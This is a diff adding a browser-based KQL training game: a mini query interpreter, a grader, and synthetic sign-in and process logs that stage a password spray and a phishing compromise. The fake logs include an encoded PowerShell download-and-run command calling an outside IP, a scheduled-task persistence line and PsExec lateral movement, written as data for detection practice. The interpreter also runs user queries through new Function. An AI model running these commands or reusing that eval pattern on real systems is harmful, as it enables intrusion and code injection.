+.skill-node.learning{border-color:var(--amber);color:var(--amber);background:rgba(255,176,32,.06);}
+.skill-node.mastered{border-color:var(--green);color:var(--green);background:rgba(57,255,136,.06);}
+
+/* accessibility */
+@media (prefers-reduced-motion: reduce){*{animation:none !important;transition:none !important;}}
+.btn:focus-visible, .icon-btn:focus-visible, .mission-card:focus-visible{outline:2px solid var(--cyan);outline-offset:2px;}
+</style>
+</head>
+<body>
+<div id="app"></div>
+<script>
+// ============================================================
+// KQL QUEST — mini KQL interpreter engine
+// Supports a practical subset of KQL sufficient for teaching:
+// tabular ops: where, project, project-away, project-rename,
+// extend, summarize ... by, distinct, sort/order by, top,
+// take/limit, count, join, mv-expand, let, union
+// scalar fns: ago(), now(), tolower, toupper, contains, has,
+// startswith, endswith, isempty, isnotempty, strcat, strlen,
+// bin(), tostring, toint, todatetime, parse_json, iff, case
+// aggs: count(), countif(), dcount(), avg(), min(), max(), sum()
+// ============================================================
+
+const NOW = new Date('2025-11-14T03:15:00Z'); // fixed "current" instant so ago() is deterministic per session load... actually we want variety per session, so this will be overridden at DB build time.
+
+function makeHelpers(nowInstant) {
+  const now = nowInstant;
+  function toDate(v) {
+    if (v instanceof Date) return v;
+    if (typeof v === 'number') return new Date(v);
+    return new Date(v);
+  }
+  function ago(spanStr) {
+    // spanStr like "1h", "30m", "7d", "45s"
+    const m = /^(\d+(?:\.\d+)?)(d|h|m|s)$/.exec(String(spanStr).trim());
+    if (!m) throw new Error(`Invalid timespan '${spanStr}'`);
+    const n = parseFloat(m[1]);
+    const unit = m[2];
+    const mult = { d: 86400000, h: 3600000, m: 60000, s: 1000 }[unit];
+    return new Date(now.getTime() - n * mult);
+  }
+  function timespanMs(spanStr) {
+    const m = /^(\d+(?:\.\d+)?)(d|h|m|s)$/.exec(String(spanStr).trim());
+    if (!m) throw new Error(`Invalid timespan '${spanStr}'`);
+    const n = parseFloat(m[1]);
+    const unit = m[2];
+    const mult = { d: 86400000, h: 3600000, m: 60000, s: 1000 }[unit];
+    return n * mult;
+  }
+  return {
+    now: () => now,
+    ago,
+    tolower: (s) => (s == null ? s : String(s).toLowerCase()),
+    toupper: (s) => (s == null ? s : String(s).toUpperCase()),
+    contains: (a, b) => a != null && String(a).toLowerCase().includes(String(b).toLowerCase()),
+    contains_cs: (a, b) => a != null && String(a).includes(String(b)),
+    has: (a, b) => {
+      if (a == null) return false;
+      const words = String(a).toLowerCase().split(/[^a-z0-9_.\-]+/i);
+      return words.includes(String(b).toLowerCase());
+    },
+    startswith: (a, b) => a != null && String(a).toLowerCase().startsWith(String(b).toLowerCase()),
+    endswith: (a, b) => a != null && String(a).toLowerCase().endsWith(String(b).toLowerCase()),
+    isempty: (a) => a === null || a === undefined || a === '',
+    isnotempty: (a) => !(a === null || a === undefined || a === ''),
+    strcat: (...args) => args.map(x => (x == null ? '' : String(x))).join(''),
+    strlen: (a) => (a == null ? 0 : String(a).length),
+    tostring: (a) => (a == null ? '' : (typeof a === 'object' ? JSON.stringify(a) : String(a))),
+    toint: (a) => parseInt(a, 10),
+    toreal: (a) => parseFloat(a),
+    todatetime: (a) => toDate(a),
+    parse_json: (a) => { try { return typeof a === 'string' ? JSON.parse(a) : a; } catch (e) { return null; } },
+    bin: (val, size) => {
+      if (val instanceof Date) {
+        const ms = timespanMs(size);
+        return new Date(Math.floor(val.getTime() / ms) * ms);
+      }
+      const n = parseFloat(size);
+      return Math.floor(val / n) * n;
+    },
+    iff: (cond, a, b) => (cond ? a : b),
+    case: (...args) => {
+      for (let i = 0; i + 1 < args.length; i += 2) {
+        if (args[i]) return args[i + 1];
+      }
+      return args.length % 2 === 1 ? args[args.length - 1] : null;
+    },
+    strlen_,
+    inArr: (v, arr) => arr.includes(v),
+    toDate,
+    timespanMs,
+    round: (v, d) => { const f = Math.pow(10, d || 0); return Math.round(v * f) / f; },
+    abs: (v) => Math.abs(v),
+    dynamic: (v) => v,
+    split: (s, sep) => (s == null ? [] : String(s).split(sep)),
+    datetime_diff: (unit, a, b) => {
+      const ms = toDate(a) - toDate(b);
+      const div = { second: 1000, minute: 60000, hour: 3600000, day: 86400000 }[unit] || 1;
+      return ms / div;
+    },
+  };
+  function strlen_(a) { return a == null ? 0 : String(a).length; }
+}
+
+// ---- expression evaluation ----
+// Translate a KQL-ish boolean/scalar expression into JS and eval it
+// against a row (object) with helper functions in scope.
+const QSTR = `"(?:[^"\\\\]|\\\\.)*"|'(?:[^'\\\\]|\\\\.)*'`;
+const OPERAND = `[\\w.$]+(?:\\([^)]*\\))?`;
+function infixToFn(str, kw, fnName) {
+  const re = new RegExp(`(${OPERAND})\\s*${kw}\\s*(${QSTR}|[\\w.$]+)`, 'gi');
+  return str.replace(re, `${fnName}($1,$2)`);
+}
+function translateExpr(expr) {
+  let e = ' ' + expr + ' ';
+  // 1) bare timespan literals like 24h, 30m, 7d, 45s -> quote them as strings (safe: outside quotes only)
+  {
+    const parts = e.split(new RegExp(`(${QSTR})`, 'g'));
+    for (let i = 0; i < parts.length; i += 2) parts[i] = parts[i].replace(/\b(\d+(?:\.\d+)?)(d|h|m|s)\b/g, '"$1$2"');
+    e = parts.join('');
+  }
+  // 2) infix string operators -> function calls (order matters: negated + longer names first)
+  e = infixToFn(e, '!contains_cs', '!contains_cs');
+  e = infixToFn(e, '!contains', '!contains');
+  e = infixToFn(e, 'contains_cs', 'contains_cs');
+  e = infixToFn(e, 'contains', 'contains');
+  e = infixToFn(e, '!has_cs', '!has');
+  e = infixToFn(e, '!has', '!has');
+  e = infixToFn(e, 'has_cs', 'has');
+  e = infixToFn(e, 'has', 'has');
+  e = infixToFn(e, '!startswith', '!startswith');
+  e = infixToFn(e, 'startswith', 'startswith');
+  e = infixToFn(e, '!endswith', '!endswith');
+  e = infixToFn(e, 'endswith', 'endswith');
+  // 3) field in (a,b,c) -> inArr(field,[a,b,c])
+  e = e.replace(/([A-Za-z_][\w.]*)\s*!in\s*\(([^)]*)\)/gi, '!inArr($1,[$2])');
+  e = e.replace(/([A-Za-z_][\w.]*)\s+in\s*\(([^)]*)\)/gi, 'inArr($1,[$2])');
+  // 4) logical keywords and ==/!= — must avoid touching quoted string contents
+  {
+    const parts = e.split(new RegExp(`(${QSTR})`, 'g'));
+    for (let i = 0; i < parts.length; i += 2) {
+      let seg = parts[i];
+      seg = seg.replace(/!=/g, '§NE§').replace(/==/g, '§EQ§');
+      seg = seg.replace(/\band\b/gi, '&&');
+      seg = seg.replace(/\bor\b/gi, '||');
+      seg = seg.replace(/\bnot\b/gi, '!');
+      seg = seg.replace(/§NE§/g, '!=').replace(/§EQ§/g, '==');
+      parts[i] = seg;
+    }
+    e = parts.join('');
+  }
+  return e;
+}
+
+function evalExpr(expr, row, helpers) {
+  const jsExpr = translateExpr(expr);
+  // eslint-disable-next-line no-new-func
+  const fn = new Function('row', 'h', `with(row){ with(h){ return (${jsExpr}); } }`);
+  return fn(row, helpers);
+}
+
+function evalAssignExpr(expr, row, helpers) {
+  return evalExpr(expr, row, helpers);
+}
+
+// ---- split a query into pipeline stages, respecting parens/quotes ----
+function splitPipeline(query) {
+  const stages = [];
+  let depth = 0, cur = '', inStr = null;
+  for (let i = 0; i < query.length; i++) {
+    const c = query[i];
+    if (inStr) {
+      cur += c;
+      if (c === inStr && query[i - 1] !== '\\') inStr = null;
+      continue;
+    }
+    if (c === '"' || c === "'") { inStr = c; cur += c; continue; }
+    if (c === '(') depth++;
+    if (c === ')') depth--;
+    if (c === '|' && depth === 0) { stages.push(cur.trim()); cur = ''; continue; }
+    cur += c;
+  }
+  if (cur.trim()) stages.push(cur.trim());
+  return stages;
+}
+
+function splitTopLevel(str, sep) {
+  const out = [];
+  let depth = 0, cur = '', inStr = null;
+  for (let i = 0; i < str.length; i++) {
+    const c = str[i];
+    if (inStr) { cur += c; if (c === inStr && str[i - 1] !== '\\') inStr = null; continue; }
+    if (c === '"' || c === "'") { inStr = c; cur += c; continue; }
+    if (c === '(') depth++;
+    if (c === ')') depth--;
+    if (c === sep && depth === 0) { out.push(cur.trim()); cur = ''; continue; }
+    cur += c;
+  }
+  if (cur.trim() !== '') out.push(cur.trim());
+  return out;
+}
+
+class KqlError extends Error {}
+
+function runQuery(query, db, nowInstant) {
+  const helpers = makeHelpers(nowInstant);
+  const letVars = {};
+  // split into statements by ';' at top level (not inside parens)
+  const statements = splitTopLevel(query, ';').filter(s => s.trim());
+  if (statements.length === 0) throw new KqlError('Empty query.');
+  let mainQuery = statements[statements.length - 1];
+  const letStatements = statements.slice(0, -1);
+  for (const stmt of letStatements) {
+    const m = /^let\s+([A-Za-z_]\w*)\s*=\s*(.*)$/is.exec(stmt.trim());
+    if (!m) throw new KqlError(`Could not parse let-statement: ${stmt}`);
+    const name = m[1];
+    let valueExpr = m[2].trim();
+    // let can define a query (starts with a known table or contains a pipe) or a scalar/timespan
+    if (db[valueExpr.split(/\s|\|/)[0]] || valueExpr.includes('|')) {
+      letVars[name] = runQuery(valueExpr, db, nowInstant); // sub-table
+    } else {
+      letVars[name] = evalExpr(valueExpr, {}, helpers);
+    }
+  }
+
+  const stages = splitPipeline(mainQuery);
+  if (stages.length === 0) throw new KqlError('Empty query.');
+  let tableToken = stages[0];
+  let rows;
+  // merge scalar let-bindings into the helper scope so expressions can reference them
+  const scalarLetVars = {};
+  Object.keys(letVars).forEach(k => { if (!Array.isArray(letVars[k])) scalarLetVars[k] = letVars[k]; });
+  const scope = Object.assign({}, helpers, scalarLetVars);
+
+  if (db[tableToken]) {
+    rows = db[tableToken].map(r => ({ ...r }));
+  } else if (letVars[tableToken] !== undefined) {
+    rows = Array.isArray(letVars[tableToken]) ? letVars[tableToken].map(r => ({ ...r })) : letVars[tableToken];
+  } else if (/^union\s+/i.test(tableToken)) {
+    const names = tableToken.replace(/^union\s+/i, '').split(',').map(s => s.trim());
+    rows = [];
+    for (const n of names) {
+      const src = db[n] || letVars[n];
+      if (!src) throw new KqlError(`Unknown table '${n}' in union.`);
+      rows.push(...src.map(r => ({ ...r })));
+    }
+  } else {
+    throw new KqlError(`Unknown table '${tableToken}'. Did you spell the table name correctly?`);
+  }
+
+  for (let s = 1; s < stages.length; s++) {
+    const stage = stages[s];
+    rows = applyStage(stage, rows, db, letVars, scope, nowInstant);
+  }
+  return rows;
+}
+
+function applyStage(stage, rows, db, letVars, helpers, nowInstant) {
+  let m;
+  if ((m = /^search\s+(?:"([^"]*)"|'([^']*)')$/i.exec(stage))) {
+    const term = (m[1] || m[2] || '').toLowerCase();
+    return rows.filter(r => Object.values(r).some(v => v != null && String(v).toLowerCase().includes(term)));
+  }
+  if ((m = /^where\s+(.*)$/is.exec(stage))) {
+    const expr = m[1];
+    return rows.filter(r => {
+      try { return !!evalExpr(expr, r, helpers); } catch (e) { throw new KqlError(`Error in 'where' clause: ${e.message}`); }
+    });
+  }
+  if ((m = /^project-away\s+(.*)$/is.exec(stage))) {
+    const cols = splitTopLevel(m[1], ',');
+    return rows.map(r => { const o = { ...r }; cols.forEach(c => delete o[c.trim()]); return o; });
+  }
+  if ((m = /^project-rename\s+(.*)$/is.exec(stage))) {
+    const parts = splitTopLevel(m[1], ',');
+    return rows.map(r => {
+      const o = { ...r };
+      parts.forEach(p => {
+        const mm = /^([A-Za-z_]\w*)\s*=\s*([A-Za-z_][\w.]*)$/.exec(p.trim());
+        if (mm) { o[mm[1]] = o[mm[2]]; delete o[mm[2]]; }
+      });
+      return o;
+    });
+  }
+  if ((m = /^project\s+(.*)$/is.exec(stage))) {
+    const parts = splitTopLevel(m[1], ',');
+    return rows.map(r => {
+      const o = {};
+      parts.forEach(p => {
+        const mm = /^([A-Za-z_]\w*)\s*=\s*(.+)$/s.exec(p.trim());
+        if (mm && !/^[A-Za-z_][\w.]*$/.test(p.trim())) {
+          o[mm[1]] = evalExpr(mm[2], r, helpers);
+        } else {
+          const col = p.trim();
+          o[col] = r[col];
+        }
+      });
+      if (r.__rid !== undefined) o.__rid = r.__rid; // preserve source-row identity through project for grading
+      return o;
+    });
+  }
+  if ((m = /^extend\s+(.*)$/is.exec(stage))) {
+    const parts = splitTopLevel(m[1], ',');
+    return rows.map(r => {
+      const o = { ...r };
+      parts.forEach(p => {
+        const mm = /^([A-Za-z_]\w*)\s*=\s*(.+)$/s.exec(p.trim());
+        if (mm) { o[mm[1]] = evalExpr(mm[2], o, helpers); }
+      });
+      return o;
+    });
+  }
+  if ((m = /^distinct\s+(.*)$/is.exec(stage))) {
+    const cols = splitTopLevel(m[1], ',').map(s => s.trim());
+    const seen = new Set();
+    const out = [];
+    for (const r of rows) {
+      const key = JSON.stringify(cols.map(c => serializeVal(r[c])));
+      if (!seen.has(key)) { seen.add(key); const o = {}; cols.forEach(c => o[c] = r[c]); out.push(o); }
+    }
+    return out;
+  }
+  if ((m = /^(?:sort|order)\s+by\s+(.*)$/is.exec(stage))) {
+    const parts = splitTopLevel(m[1], ',');
+    const specs = parts.map(p => {
+      const mm = /^(.+?)\s+(asc|desc)$/i.exec(p.trim());
+      return mm ? { col: mm[1].trim(), dir: mm[2].toLowerCase() } : { col: p.trim(), dir: 'desc' };
+    });
+    const out = [...rows];
+    out.sort((a, b) => {
+      for (const s2 of specs) {
+        const av = a[s2.col], bv = b[s2.col];
+        const cmp = compareVals(av, bv);
+        if (cmp !== 0) return s2.dir === 'asc' ? cmp : -cmp;
+      }
+      return 0;
+    });
+    return out;
+  }
+  if ((m = /^top\s+(\d+)\s+by\s+(.*)$/is.exec(stage))) {
+    const n = parseInt(m[1], 10);
+    const sorted = applyStage(`sort by ${m[2]}`, rows, db, letVars, helpers, nowInstant);
+    return sorted.slice(0, n);
+  }
+  if ((m = /^(?:take|limit)\s+(\d+)$/i.exec(stage))) {
+    return rows.slice(0, parseInt(m[1], 10));
+  }
+  if (/^count$/i.test(stage.trim()) || /^count\s*\(\s*\)$/i.test(stage.trim())) {
+    return [{ Count: rows.length }];
+  }
+  if ((m = /^summarize\s+(.*?)(?:\s+by\s+(.*))?$/is.exec(stage))) {
+    const aggPart = m[1];
+    const byPart = m[2];
+    const byCols = byPart ? splitTopLevel(byPart, ',') : [];
+    const byBindings = byCols.map(b => {
+      const mm = /^([A-Za-z_]\w*)\s*=\s*(.+)$/s.exec(b.trim());
+      return mm ? { name: mm[1], expr: mm[2] } : { name: b.trim(), expr: b.trim() };
+    });
+    const aggSpecs = splitTopLevel(aggPart, ',').map(a => {
+      const mm = /^([A-Za-z_]\w*)\s*=\s*(.+)$/s.exec(a.trim());
+      if (mm) return { name: mm[1], expr: mm[2] };
+      const auto = a.trim().replace(/[()]/g, '_').replace(/[^A-Za-z0-9_]/g, '');
+      return { name: auto || 'Value', expr: a.trim() };
+    });
+    const groups = new Map();
+    for (const r of rows) {
+      const keyVals = byBindings.map(b => evalExpr(b.expr, r, helpers));
+      const key = JSON.stringify(keyVals.map(serializeVal));
+      if (!groups.has(key)) groups.set(key, { keyVals, items: [] });
+      groups.get(key).items.push(r);
+    }
+    if (groups.size === 0 && byBindings.length === 0) groups.set('[]', { keyVals: [], items: [] });
+    const out = [];
+    for (const { keyVals, items } of groups.values()) {
+      const o = {};
+      byBindings.forEach((b, i) => o[b.name] = keyVals[i]);
+      aggSpecs.forEach(spec => { o[spec.name] = computeAgg(spec.expr, items, helpers); });
+      out.push(o);
+    }
+    return out;
+  }
+  if ((m = /^mv-expand\s+([A-Za-z_]\w*)$/i.exec(stage))) {
+    const col = m[1];
+    const out = [];
+    for (const r of rows) {
+      const arr = r[col];
+      if (Array.isArray(arr) && arr.length) {
+        arr.forEach(v => out.push({ ...r, [col]: v }));
+      } else {
+        out.push({ ...r });
+      }
+    }
+    return out;
+  }
+  if ((m = /^join\s+(?:kind\s*=\s*(\w+)\s+)?(.*)$/is.exec(stage))) {
+    const kind = (m[1] || 'inner').toLowerCase();
+    let rest = m[2].trim();
+    let rightRows, rightLabel;
+    if (rest.startsWith('(')) {
+      // find the matching closing paren
+      let depth = 0, endIdx = -1;
+      for (let i = 0; i < rest.length; i++) {
+        if (rest[i] === '(') depth++;
+        else if (rest[i] === ')') { depth--; if (depth === 0) { endIdx = i; break; } }
+      }
+      if (endIdx === -1) throw new KqlError('Unbalanced parentheses in join.');
+      const inner = rest.slice(1, endIdx).trim();
+      rest = rest.slice(endIdx + 1).trim();
+      rightLabel = inner;
+      if (db[inner]) rightRows = db[inner];
+      else rightRows = runQuery(inner, db, nowInstant);
+    } else {
+      const idM = /^([A-Za-z_]\w*)/.exec(rest);
+      rightLabel = idM ? idM[1] : rest;
+      rest = rest.slice(rightLabel.length).trim();
+      rightRows = db[rightLabel] || letVars[rightLabel];
+    }
+    const onM = /^on\s+(.*)$/is.exec(rest);
+    if (!onM) throw new KqlError("join is missing an 'on' clause.");
+    const onExpr = onM[1].trim();
+    if (!rightRows) throw new KqlError(`Unknown table '${rightLabel}' in join.`);
+    let leftCol, rightCol;
+    const eqM = /^\$left\.(\w+)\s*==\s*\$right\.(\w+)$/.exec(onExpr);
+    if (eqM) { leftCol = eqM[1]; rightCol = eqM[2]; }
+    else { leftCol = rightCol = onExpr.trim(); }
+    const rightIndex = new Map();
+    rightRows.forEach(rr => {
+      const k = serializeVal(rr[rightCol]);
+      if (!rightIndex.has(k)) rightIndex.set(k, []);
+      rightIndex.get(k).push(rr);
+    });
+    const out = [];
+    for (const lr of rows) {
+      const matches = rightIndex.get(serializeVal(lr[leftCol])) || [];
+      if (matches.length) {
+        matches.forEach(rr => {
+          const o = { ...lr };
+          Object.keys(rr).forEach(k => { o[(k in o && k !== rightCol) ? k + '1' : k] = rr[k]; });
+          out.push(o);
+        });
+      } else if (kind === 'leftouter' || kind === 'leftanti') {
+        if (kind === 'leftanti') out.push({ ...lr });
+        // leftouter with no match: include with nulls (skipped for simplicity unless needed)
+        if (kind === 'leftouter') out.push({ ...lr });
+      }
+    }
+    return out;
+  }
+  throw new KqlError(`Unrecognized or unsupported operator: '${stage.split(/\s+/)[0]}'`);
+}
+
+function computeAgg(expr, items, helpers) {
+  let m;
+  if (/^count\s*\(\s*\)$/i.test(expr.trim())) return items.length;
+  if ((m = /^countif\s*\((.*)\)$/is.exec(expr.trim()))) {
+    return items.filter(r => { try { return !!evalExpr(m[1], r, helpers); } catch (e) { return false; } }).length;
+  }
+  if ((m = /^dcount\s*\((.*)\)$/is.exec(expr.trim()))) {
+    const set = new Set(items.map(r => serializeVal(evalExpr(m[1], r, helpers))));
+    return set.size;
+  }
+  if ((m = /^(avg|min|max|sum)\s*\((.*)\)$/is.exec(expr.trim()))) {
+    const fn = m[1];
+    const vals = items.map(r => Number(evalExpr(m[2], r, helpers))).filter(v => !isNaN(v));
+    if (!vals.length) return null;
+    if (fn === 'avg') return vals.reduce((a, b) => a + b, 0) / vals.length;
+    if (fn === 'min') return Math.min(...vals);
+    if (fn === 'max') return Math.max(...vals);
+    if (fn === 'sum') return vals.reduce((a, b) => a + b, 0);
+  }
+  if ((m = /^make_list\s*\((.*)\)$/is.exec(expr.trim()))) {
+    return items.map(r => evalExpr(m[1], r, helpers));
+  }
+  // fallback: evaluate on first row (rare)
+  return items.length ? evalExpr(expr, items[0], helpers) : null;
+}
+
+function serializeVal(v) {
+  if (v instanceof Date) return v.toISOString();
+  if (v === undefined) return 'null';
+  return JSON.stringify(v);
+}
+function compareVals(a, b) {
+  if (a instanceof Date || b instanceof Date) return new Date(a) - new Date(b);
+  if (typeof a === 'number' && typeof b === 'number') return a - b;
+  return String(a).localeCompare(String(b));
+}
+
+// ---- result grading: compares a learner's result set against the solution's,
+// tolerant of column renaming/reordering (compares by value, not by column name) ----
+function stripRid(row) {
+  const o = {};
+  for (const k in row) if (k !== '__rid') o[k] = row[k];
+  return o;
+}
+function normVal(v) {
+  if (v instanceof Date) return v.toISOString().slice(0, 16);
+  if (typeof v === 'number') return Math.round(v * 100) / 100;
+  if (v == null) return '';
+  if (typeof v === 'object') return JSON.stringify(v);
+  const s = String(v).trim().toLowerCase();
+  // normalize date-like strings too
+  const d = new Date(s);
+  if (!isNaN(d) && /\d{4}-\d{2}-\d{2}/.test(s)) return d.toISOString().slice(0, 16);
+  return s;
+}
+function rowContainsValues(row, values) {
+  const rowVals = Object.values(stripRid(row)).map(normVal);
+  return values.every(v => rowVals.includes(normVal(v)));
+}
+function gradeResult(userRows, expectedRows) {
+  if (!Array.isArray(userRows)) userRows = [];
+  if (expectedRows.length === 0) {
+    return { status: userRows.length === 0 ? 'success' : 'incorrect', matched: 0, expected: 0, got: userRows.length };
+  }
+  const canUseRid = expectedRows.every(r => r && r.__rid !== undefined) && userRows.every(r => r && r.__rid !== undefined);
+  let matchedExpected, missing;
+  if (canUseRid) {
+    // identity-preserving pipeline (where/project/extend/sort/take/distinct-on-full-row etc.):
+    // compare by which underlying source rows were selected, ignoring which columns were displayed.
+    const userRidSet = new Set(userRows.map(r => r.__rid));
+    matchedExpected = expectedRows.filter(er => userRidSet.has(er.__rid));
+    missing = expectedRows.length - matchedExpected.length;
+  } else {
+    // aggregate/join/union pipeline: compare by value content instead of row identity.
+    matchedExpected = expectedRows.filter(er => userRows.some(ur => rowContainsValues(ur, Object.values(stripRid(er)))));
+    missing = expectedRows.length - matchedExpected.length;
+  }
+  if (userRows.length === 0) return { status: 'empty', matched: 0, expected: expectedRows.length, got: 0 };
+  if (missing === 0 && userRows.length === expectedRows.length) {
+    return { status: 'success', matched: matchedExpected.length, expected: expectedRows.length, got: userRows.length };
+  }
+  if (missing === 0 && userRows.length > expectedRows.length) {
+    return { status: 'partial_over', matched: matchedExpected.length, expected: expectedRows.length, got: userRows.length };
+  }
+  if (missing > 0 && missing < expectedRows.length) {
+    return { status: 'partial_under', matched: matchedExpected.length, expected: expectedRows.length, got: userRows.length };
+  }
+  return { status: 'incorrect', matched: matchedExpected.length, expected: expectedRows.length, got: userRows.length };
+}
+
+// Deterministic-ish RNG so a session's dataset is stable across query runs.
+function mulberry32(seed) {
+  return function () {
+    seed |= 0; seed = (seed + 0x6D2B79F5) | 0;
+    let t = Math.imul(seed ^ (seed >>> 15), 1 | seed);
+    t = (t + Math.imul(t ^ (t >>> 7), 61 | t)) ^ t;
+    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
+  };
+}
+
+function buildDatabase(NOW, seed) {
+  const rnd = mulberry32(seed || 1337);
+  const pick = (arr) => arr[Math.floor(rnd() * arr.length)];
+  const ago = (ms) => new Date(NOW.getTime() - ms);
+  const H = 3600000, M = 60000, D = 86400000;
+
+  const normalUsers = [
+    'asmith@nightwave.io', 'bwong@nightwave.io', 'ktran@nightwave.io', 'mgarcia@nightwave.io',
+    'rpatel@nightwave.io', 'lcohen@nightwave.io', 'dnguyen@nightwave.io', 'evasquez@nightwave.io',
+    'jkim@nightwave.io', 'tobrien@nightwave.io', 'swilliams@nightwave.io', 'hmuller@nightwave.io',
+  ];
+  const victimUser = 'jchen@nightwave.io';
+  const sprayVictims = ['asmith@nightwave.io', 'bwong@nightwave.io', 'ktran@nightwave.io', 'mgarcia@nightwave.io', 'rpatel@nightwave.io'];
+  const officeIPs = ['10.20.0.11', '10.20.0.42', '10.20.1.8', '10.20.2.19', '10.20.3.5'];
+  const attackerIP = '185.220.101.47';
+  const sprayIP = '45.155.204.10';
+  const locations = ['US', 'US', 'US', 'GB', 'DE', 'CA'];
+  const suspiciousLoc = 'RU';
+  const apps = ['Office 365 Exchange Online', 'Microsoft Teams', 'SharePoint Online', 'Azure Portal'];
+
+  const SigninLogs = [];
+  // background noise: normal successful logins over the last 7 days
+  for (let i = 0; i < 220; i++) {
+    SigninLogs.push({
+      TimeGenerated: ago(rnd() * 7 * D),
+      UserPrincipalName: pick(normalUsers),
+      IPAddress: pick(officeIPs),
+      Location: pick(locations),
+      ResultType: 0,
+      ResultDescription: 'Success',
+      AppDisplayName: pick(apps),
+      ConditionalAccessStatus: 'success',
+    });
+  }
+  // occasional single mistyped-password blips (normal noise, not an attack)
+  for (let i = 0; i < 12; i++) {
+    SigninLogs.push({
+      TimeGenerated: ago(rnd() * 7 * D),
+      UserPrincipalName: pick(normalUsers),
+      IPAddress: pick(officeIPs),
+      Location: pick(locations),
+      ResultType: 50126,
+      ResultDescription: 'Error validating credentials due to invalid username or password',
+      AppDisplayName: pick(apps),
+      ConditionalAccessStatus: 'success',
+    });
+  }
+  // SCENARIO: The Midnight Login — jchen's account hammered with failed attempts, then a success, from RU
+  for (let i = 0; i < 9; i++) {
+    SigninLogs.push({
+      TimeGenerated: ago(2 * H + 47 * M - i * M),
+      UserPrincipalName: victimUser,
+      IPAddress: attackerIP,
+      Location: suspiciousLoc,
+      ResultType: 50126,
+      ResultDescription: 'Error validating credentials due to invalid username or password',
+      AppDisplayName: 'Office 365 Exchange Online',
+      ConditionalAccessStatus: 'success',
+    });
+  }
+  SigninLogs.push({
+    TimeGenerated: ago(2 * H + 30 * M),
+    UserPrincipalName: victimUser,
+    IPAddress: attackerIP,
+    Location: suspiciousLoc,
+    ResultType: 0,
+    ResultDescription: 'Success',
+    AppDisplayName: 'Office 365 Exchange Online',
+    ConditionalAccessStatus: 'success',
+  });
+  // an "impossible travel" companion: jchen also signs in from the office 4 minutes later (physically impossible)
+  SigninLogs.push({
+    TimeGenerated: ago(2 * H + 26 * M),
+    UserPrincipalName: victimUser,
+    IPAddress: officeIPs[0],
+    Location: 'US',
+    ResultType: 0,
+    ResultDescription: 'Success',
+    AppDisplayName: 'Office 365 Exchange Online',
+    ConditionalAccessStatus: 'success',
+  });
+  // SCENARIO: Password spray — one external IP hits 5 accounts, each with >10 fails inside a 30-min window
+  const sprayStart = 18 * H;
+  sprayVictims.forEach((u, ui) => {
+    for (let i = 0; i < 13; i++) {
+      SigninLogs.push({
+        TimeGenerated: ago(sprayStart - ui * M - i * 90000),
+        UserPrincipalName: u,
+        IPAddress: sprayIP,
+        Location: suspiciousLoc,
+        ResultType: 50126,
+        ResultDescription: 'Error validating credentials due to invalid username or password',
+        AppDisplayName: 'Office 365 Exchange Online',
+        ConditionalAccessStatus: 'success',
+      });
+    }
+  });
+  SigninLogs.sort((a, b) => a.TimeGenerated - b.TimeGenerated);
+
+  // ---------------- DeviceProcessEvents ----------------
+  const devices = ['FIN-WKS-014', 'HR-WKS-002', 'ENG-WKS-031', 'MKT-WKS-009', 'FIN-SRV-02', 'DC-01'];
+  const normalProcs = [
+    { FileName: 'outlook.exe', cmd: 'outlook.exe /recycle' },
+    { FileName: 'chrome.exe', cmd: 'chrome.exe --profile-directory=Default' },
+    { FileName: 'teams.exe', cmd: 'teams.exe' },
+    { FileName: 'excel.exe', cmd: 'excel.exe /dde' },
+    { FileName: 'onedrive.exe', cmd: 'OneDrive.exe /background' },
+  ];
+  const DeviceProcessEvents = [];
+  for (let i = 0; i < 260; i++) {
+    const p = pick(normalProcs);
+    DeviceProcessEvents.push({
+      TimeGenerated: ago(rnd() * 7 * D),
+      DeviceName: pick(devices),
+      AccountName: pick(normalUsers).split('@')[0],
+      FileName: p.FileName,
+      ProcessCommandLine: p.cmd,
+      InitiatingProcessFileName: 'explorer.exe',
+      InitiatingProcessCommandLine: 'explorer.exe',
+      SHA256: 'a1'.repeat(32),
+    });
+  }
+  // SCENARIO: phishing macro -> winword spawns powershell with encoded command (initial access on FIN-WKS-014)
+  DeviceProcessEvents.push({
+    TimeGenerated: ago(2 * H + 20 * M),
+    DeviceName: 'FIN-WKS-014',
+    AccountName: 'jchen',
+    FileName: 'powershell.exe',
+    ProcessCommandLine: 'powershell.exe -NoP -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AOQAxAC4AMgAxADkALgAyADMANwAuADEANQAvAHUAcABkAC4AcABzADEAJwApAA==',
+    InitiatingProcessFileName: 'winword.exe',
+    InitiatingProcessCommandLine: 'winword.exe /n "Invoice_Q3_Overdue.docm"',
+    SHA256: 'e3b0c44298fc1c149afbf4c8996fb924',
+  });
+  // downloaded payload dropped to disk + persistence via scheduled task (LOLBin: schtasks.exe)
+  DeviceProcessEvents.push({
+    TimeGenerated: ago(2 * H + 18 * M),
+    DeviceName: 'FIN-WKS-014',
+    AccountName: 'jchen',
+    FileName: 'schtasks.exe',
+    ProcessCommandLine: 'schtasks.exe /create /sc minute /mo 5 /tn "MicrosoftEdgeUpdateTaskMachineUA2" /tr "C:\\Users\\jchen\\AppData\\Roaming\\upd.ps1" /f',
+    InitiatingProcessFileName: 'powershell.exe',
+    InitiatingProcessCommandLine: 'powershell.exe -NoP -W Hidden -Enc SQBFAFgA...',
+    SHA256: 'b2c1d4e5f6a7b8c9d0e1f2a3b4c5d6e7',
+  });
+  // lateral movement to FIN-SRV-02 via PsExec-style remote exec
+  DeviceProcessEvents.push({
+    TimeGenerated: ago(1 * H + 55 * M),
+    DeviceName: 'FIN-WKS-014',
+    AccountName: 'jchen',
+    FileName: 'PsExec64.exe',
+    ProcessCommandLine: 'PsExec64.exe \\\\FIN-SRV-02 -accepteula -s cmd.exe /c whoami',
+    InitiatingProcessFileName: 'powershell.exe',
+    InitiatingProcessCommandLine: 'powershell.exe -NoP -W Hidden -Enc SQBFAFgA...',
+    SHA256: 'c3d2e1f0a9b8c7d6e5f4a3b2c1d0e9f8',
+  });
+  DeviceProcessEvents.push({
+    TimeGenerated: ago(1 * H + 50 * M),
+    DeviceName: 'FIN-SRV-02',
+    AccountName: 'jchen',
+    FileName: 'cmd.exe',
+    ProcessCommandLine: 'cmd.exe /c whoami',
+    InitiatingProcessFileName: 'PSEXESVC.exe',
